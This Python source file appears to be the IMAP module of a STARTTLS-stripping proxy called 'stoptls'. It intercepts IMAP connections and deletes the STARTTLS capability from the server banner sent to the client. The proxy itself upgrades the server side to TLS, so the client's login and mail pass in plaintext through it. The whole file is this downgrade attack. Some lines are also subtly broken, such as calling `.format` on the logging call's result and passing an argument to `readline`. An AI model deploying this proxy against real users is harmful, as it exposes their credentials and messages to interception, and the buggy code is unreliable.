import re
import logging

from stoptls.tcp.base import TCPProxyConn


class IMAPProxyConn(TCPProxyConn):
    protocol = 'IMAP'
    ports = (143,)
    command_re = re.compile('^(?P<tag>\S*) (?P<cmd>[A-Za-z]*)\r?\n$')
    response_re = re.compile('^(?P<tag>\S*) (?:(?P<ok>[Oo][Kk])|(?P<bad>[Bb][Aa][Dd])|(?P<no>[Nn][Oo])|(?P<bye>[Bb][Yy][Ee]) )?(?P<response>.*)\r\n$')
    starttls_re = re.compile('( ?)STARTTLS( ?)', flags=re.IGNORECASE)

    async def strip(self):
        cls = type(self)
        banner = await self.server_reader.readline()
        logging.debug('Received banner: {}'.format(banner))

        banner = banner.decode('ascii')
        banner_re = cls.response_re.fullmatch(banner)

        if banner_re and \
           banner_re.group('response') and \
           cls.starttls_re.search(banner_re.group('response')):
            banner = cls.starttls_re.sub('', banner_re.group(0))
            await self.start_tls()
        else:
            # It's possible that STARTTLS, among other CAPABILITYs - wasn't
            # included in the IMAP banner. In this case, we issue the
            # CAPABILITY command. If STARTTLS is indeed a capability, then we
            # upgrade the connection
            self.server_writer.write(b'asdf CAPABILITY\n')
            await self.server_writer.drain()

            tls_supported = await self.server_reader.readline('\n')
            logging.debug('Received data from server:{}').format(tls_supported)
            tls_supported_re = cls.response_re.fullmatch(tls_supported.decode('ascii'))

            if tls_supported_re and \
               tls_supported_re.group('response') and \
               cls.starttls_re.search(tls_supported_re.group('response')):
                await self.start_tls()

        self.client_writer.write(banner.encode('ascii'))
        logging.debug('Writing banner to client...')
        await self.client_writer.drain()

        while not self.server_reader.at_eof():
            client_data = await self.client_reader.readline()
            logging.debug('Received client data: {}'.format(client_data))

            if self.client_reader.at_eof():
                logging.debug('Client closed connection')
                break

            try:
                self.server_writer.write(client_data)
                logging.debug('Writing client data to server...')
                await self.server_writer.drain()
            except ConnectionResetError:
                break

            while True:
                logging.debug('Reading from server...')
                server_data = await self.server_reader.readline()

                logging.debug('Received server data: {}'.format(server_data))

                self.client_writer.write(server_data)
                logging.debug('Writing server data to client...')
                await self.client_writer.drain()

                server_data_re = cls.response_re.fullmatch(server_data.decode('ascii'))

                if not server_data_re or \
                   server_data_re.group('tag') != '*' or \
                   server_data_re.group('bad'):
                    break

        await super().strip()

    async def start_tls(self):
        self.server_writer.write('asdf STARTTLS\n'.encode('ascii'))
        await self.server_writer.drain()

        tls_started = await self.server_reader.readline()
        tls_started_re = type(self).response_re.fullmatch(tls_started.decode('ascii'))

        if tls_started_re and tls_started_re.group('ok'):
            logging.debug('Sucessfully upgraded to TLS!')
            return await self.upgrade_connection()
        else:
            logging.debug('Failed to upgrade to TLS')
            return False
